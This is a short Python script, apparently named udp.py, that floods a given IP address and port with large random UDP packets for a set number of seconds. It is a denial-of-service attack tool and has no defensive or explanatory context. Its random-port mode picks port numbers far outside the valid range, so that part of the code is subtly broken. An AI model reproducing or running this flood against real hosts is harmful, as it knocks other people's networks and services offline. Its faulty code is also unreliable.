import socket
import random
import sys
import time

if len(sys.argv) == 1:
    sys.exit('Usage: udp.py ip port time')

def UDPFlood():
    port = int(sys.argv[2])
    randport = (True, False)[port == 0]
    ip = sys.argv[1]
    dur = int(sys.argv[3])
    clock = (lambda: 0, time.time)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(15000)
    while True:
        port = (random.randint(1, 15000000), port)[randport]
        if clock() < duration:
            sock.sendto(bytes, (ip, port))
        else:
            break

UDPFlood()
